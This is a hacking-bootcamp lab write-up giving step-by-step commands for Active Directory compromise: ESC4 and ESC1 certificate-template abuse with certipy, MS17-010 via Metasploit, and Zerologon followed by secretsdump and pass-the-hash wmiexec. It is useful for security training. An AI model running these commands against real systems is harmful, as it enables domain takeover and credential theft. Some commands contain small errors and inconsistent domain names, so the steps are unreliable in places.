# Network Reconnaissance and Compromise of Network Infrastructure - Day 8

## Overview
This document outlines the labs completed on 08/06/2025 during the hacking bootcamp, focusing on network reconnaissance and compromise of network infrastructure.

## Table of Contents
- [Lab 1: Privilege Escalation via ESC4](#lab-1-privilege-escalation-via-esc4)
- [Lab 2: Privilege Escalation via ESC1](#lab-2-privilege-escalation-via-esc1)
- [Lab 3: Network Intelligence and Compromise of Windows Machines](#lab-3-network-intelligence-and-compromise-of-windows-machines)
- [Lab 4: Zerologon](#lab-4-zerologon)

## Labs

### Lab 1: Privilege Escalation via ESC4
#### Objective
Escalate privileges on a domain controller by exploiting the ESC4 vulnerability.

#### Vulnerabilities
- ESC4: Misconfigured Active Directory Certificate Services (AD CS) allows privilege escalation through certificate abuse.

#### Requirements
Lab domain controller must be running and accessible with AD CS configured. Credentials for a low privilege user (user:password) should be available.

#### Steps
1. **Setup**
   - Verify connectivity to the domain controller.
   ```bash
   ping <DC_IP>
   ```
2. **Reconnaissance**
   - Enumerate and find vulnerable AD CS certificate templates. 
   ```bash
   certipy-ad  find -u user -p 'password' -dc-ip <DC_IP> -vulnerable -stdout
   ```
3. **Patch Vulnerable Template**
   - Update the vulnerable ESC4 template to ESC1 style. The vulnerable template in the lab was 'WebUser'.
   ```bash
   certipy-ad  template -u 'user@corp.local' -p 'password' -dc-ip <DC_IP> -template <VULN_TEMPLATE> -write-default-configuration
   ```
4. **Exploitation**
   - Request a certificate with elevated permissions and export it. The certificate authority in our case was 'CA-CYBER'.
   ```bash
   certipy-ad req -u 'user@domain.local' -p 'password' -ca <CA_NAME> -template <VULN_TEMPLATE> -dc-ip <DC_IP> -upn 'administrator@corp.local' -dns 'dc.corp.local' -sid 'S-1-5-21-..-500'
   ```
   - The certificate will be saved to the current directory, in our case, as 'administrator_dc.pfx'. Use it to authenticate.
   ```bash
   certipy-ad auth -pfx <CERT_FILE_NAME> -DC-IP <DC_IP>
   ```
   - Use impacket-smbclient to authenticated with the administrator's username and password obtained.
   ```bash
   impacket-smbclient corp.local/administrator@<DC_IP> -hashes <HASH_OBTAINED>
   ```
   - List the available smb shares with the command `shares` and connect to one `use <SHARE_NAME>`. In our case, the share was `C$` and the flag located in the desktop of the administrator user.


#### Why It Works
ESC4 exploits misconfigured certificate templates that allow low-privileged users to request certificates with excessive permissions, enabling privilege escalation.

#### Alternatives
- Use manual certificate requests via PowerShell for finer control.

#### Resources
- [Certipy Documentation: https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)
- [AD CS Attacks: https://www.specterops.io/assets/resources/ADCS_Attacks.pdf]

#### Notes
- Ensure valid domain credentials are used for enumeration.
- Download certipy-(ad) and impacket if not already available.

---

### Lab 2: Privilege Escalation via ESC1
#### Objective
Escalate privileges on a domain controller by exploiting the ESC1 vulnerability in AD CS.

#### Vulnerabilities
- ESC1: Vulnerable certificate templates allow unauthorized users to enroll with domain admin privileges.

#### Requirements
Lab domain controller must be accessible with AD CS enabled. Credentials for low privilege user (user:password) must be available.

#### Steps
1. **Setup**
   - Confirm access to the domain environment.
   ```bash
   ping <DC_IP>
   ```
2. **Reconnaissance**
   - Enumerate and find vulnerable AD CS certificate templates. 
   ```bash
   certipy-ad  find -u user -p 'password' -dc-ip <DC_IP> -vulnerable -stdout
   ```
3. **Exploitation**
   - Request a certificate with elevated permissions and export it. The certificate authority in our case was 'CA-CYBER'. The vulnerable template in out case was 'VPNUser'.
   ```bash
   certipy-ad req -u 'user@domain.local' -p 'password' -ca <CA_NAME> -template <VULN_TEMPLATE> -dc-ip <DC_IP> -upn 'administrator@corp.local' 
   ```
   - The certificate will be saved to the current directory, in our case, as 'administrator.pfx'. Uset it to authenticate.
   ```bash
   certipy-ad auth -pfx <CERT_FILE_NAME> -DC-IP <DC_IP>
   ```
   - Use impacket-smbclient to authenticated with the administrator's username and password obtained.
   ```bash
   impacket-smbclient corp.local/administrator@<DC_IP> -hashes <HASH_OBTAINED>
   ```
   - List the available smb shares with the command `shares` and connect to one `use <SHARE_NAME>`. In our case, the share was `C$` and the flag located in the desktop of the administrator user.

#### Why It Works
ESC1 allows attackers to exploit overly permissive certificate templates, granting unauthorized domain admin access via certificate enrollment.

#### Alternatives
- Exploit ESC1 manually using Certreq.exe for deeper understanding.

#### Resources
- [SpecterOps ESC1 Guide: https://posts.specterops.io/certified-pre-owned-d95910965cd2](https://posts.specterops.io/certified-pre-owned-d95910965cd2)

#### Notes
- Verify template permissions before attempting exploitation.

---

### Lab 3: Network Intelligence and Compromise of Windows Machines
#### Objective
Gather network intelligence and compromise a Windows machine using credential dumping.

#### Vulnerabilities
- Weak Credentials: Insecure password policies enable credential dumping.
- SMB Vulnerabilities: Unpatched systems allow remote exploitation.

#### Requirements
Target Windows machine must be accessible via SMB.

#### Steps
1. **Setup**
   - Ensure network connectivity to the target.
   ```bash
   ping <TARGET_IP>
   ```
2. **Reconnaissance**
   - Scan for open SMB ports and services. IPs should be present in the file.
   ```bash
   nmap -Pn -n -sT -p 88,135,137,389,445,1433,3389 -sV -sC --open -iL list-of-machines.txt
   ```
   - Alternatively,
   ```bash
    nmap -Pn -sV -p445 --script smb-vuln-ms17-010 -v <VICTIM_IP>
   ```
3. **Exploitation**
   - You can use msfconsole with the exploit:
   ```bash
   $ use auxilliary/admin/smb/ms17_010_command
   $ set RHOSTS <TARGET_IP>
   $ check
   $ exploit
   ```
   - You will gain RCE and obtain the flag from the desktop of the user Administrator.

#### Why It Works
TO-DO..
#### Alternatives
TO-DO..

#### Resources
- [Nmap SMB Scripts: https://nmap.org/nsedoc/categories/smb.html]

#### Notes
- Beware!! It is a very dangerous exploit that may crash the whole server in production. 

---

### Lab 4: Zerologon
#### Objective
Exploit the Zerologon vulnerability to reset a domain controller’s machine account password.

#### Vulnerabilities
- Zerologon (CVE-2020-1472): Flawed Netlogon authentication allows password reset without credentials.

#### Requirements
Target domain controller must be running an unpatched Windows Server.

#### Steps
1. **Setup**
   - Verify connectivity to the domain controller.
   ```bash
   ping <DC_IP>
   ```
2. **Reconnaissance**
   - Confirm Netlogon service is active.
   ```bash
   $ nmap -Pn -n -F -v --open <DC_IP>
   $ nmap -Pn -n -p 445 -sV -sC -v --open <DC_IP>
   ```
3. **Exploitation**
   - Use Zerologon in msfconsole to exploit to reset the DC password. Obtain the DC and hsot name  from nmap scan or from the command `nxc smb <DC_IP>`. In our case it was 'DC1'.
   ```bash
   msf6>$ use auxiliary/admin/dcerpc/cve_2020_1472_zerologon
   msf6>$ set RHOSTS <DC_IP>
   msf6>$ set NBNAME DC1
   msf6>$ check
   msf6>$ exploit
   ```
   - After successfully executing the exploit, we can dump the secrets with impacket secrets dump.
   ```bash
   impacket-secretsdump -no-pass -just-dc-user administrator 'sandbox.local/DC1$<DC_IP>' 
   ```
   - Use the dumped hash to connect with the impacket module wmiexec. You will find the flag in the desktop of the Administrator directory.
   ```bash
   impacket-wmiexec -hashes '<HASH_OBTAINED>' 'sandbox.local/administrator@<DC_IP>'
   ```

#### Why It Works
Zerologon exploits a cryptographic flaw in the Netlogon protocol, allowing attackers to authenticate as the domain controller and reset its password.

#### Alternatives
- Use Impacket’s secretsdump.py to extract credentials post-exploit.

#### Resources
- [Zerologon CVE-2020-1472: https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1472](https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1472)
- [Secura Zerologon Whitepaper: https://www.secura.com/whitepapers/whitepaper-zerologon]

#### Notes
- Ensure the target is unpatched (pre-September 2020) for Zerologon to work.
- Ensure you install impacket.

---